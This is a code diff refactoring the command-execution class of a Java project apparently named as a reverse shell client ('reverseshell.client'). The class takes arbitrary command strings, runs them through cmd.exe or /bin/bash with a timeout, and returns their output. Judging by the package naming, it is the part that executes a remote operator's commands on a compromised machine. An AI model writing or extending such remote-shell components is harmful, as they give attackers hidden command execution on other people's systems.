@@ -1,44 +1,39 @@
-package obs1d1anc1ph3r.reverseshell.commandhandling;
+package obs1d1anc1ph3r.reverseshell.client.commandhandling;
 
 import java.io.BufferedReader;
 import java.io.File;
-import java.io.IOException;
 import java.io.InputStreamReader;
+import java.io.IOException;
 import java.util.concurrent.TimeUnit;
-import obs1d1anc1ph3r.reverseshell.plugins.CDCommand;
+import java.util.stream.Collectors;
+
+import obs1d1anc1ph3r.reverseshell.client.plugins.CDCommand;
+import obs1d1anc1ph3r.reverseshell.client.utils.OSUtils;
 
 public class CommandExecutor {
 
-	//Comand executor
+	private static final String SHELL;
+	private static final String SHELLFLAG;
+
+	static {
+		SHELL = OSUtils.getShell();
+		SHELLFLAG = OSUtils.getShellFlag();
+	}
+
 	public String executeCommand(String command) {
-		StringBuilder output = new StringBuilder();
-		//ToDo -- Make the os, shell, and shell flag fixed variables, so it only has to figure it out once
-		//Next day -- might do it later today if I feel like it
+		Process process = null;
 		try {
-			String os = System.getProperty("os.name").toLowerCase();
-			String shell;
-			String shellFlag;
-			if (os.contains("win")) {
-				shell = "cmd.exe";
-				shellFlag = "/c";
-			} else {
-				shell = "/bin/bash";
-				shellFlag = "-c";
-			}
+			ProcessBuilder builder = new ProcessBuilder(SHELL, SHELLFLAG, command);
+			builder.redirectErrorStream(true);
+			builder.directory(new File(CDCommand.getCurrentDirectory()));
 
-			//Make the command
-			ProcessBuilder processBuilder = new ProcessBuilder(shell, shellFlag, command);
-			processBuilder.redirectErrorStream(true);
-			processBuilder.directory(new File(CDCommand.getCurrentDirectory()));
-			Process process = processBuilder.start();
+			process = builder.start();
 
+			String output;
 			try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
-				String line;
-				while ((line = reader.readLine()) != null) {
-					output.append(line).append("\n");
-				}
+				output = reader.lines().collect(Collectors.joining("\n"));
 			}
-			//If no worky, then say fuck it and give up :)
+
 			boolean finished = process.waitFor(10, TimeUnit.SECONDS);
 			if (!finished) {
 				process.destroy();
@@ -47,14 +42,17 @@ public class CommandExecutor {
 
 			int exitCode = process.exitValue();
 			if (exitCode != 0) {
-				return "Error executing command, exit code: " + exitCode;
+				return "[ERROR] Exit code: " + exitCode + "\n" + output;
 			}
+
+			return output.isEmpty() ? "[INFO] Command executed but returned no output." : output.trim();
 
 		} catch (IOException | InterruptedException e) {
 			return "Error executing command: " + e.getMessage();
+		} finally {
+			if (process != null) {
+				process.destroy(); // Ensure the process is cleaned up
+			}
 		}
-		//Return the thing
-		return output.toString().trim();
 	}
-
 }
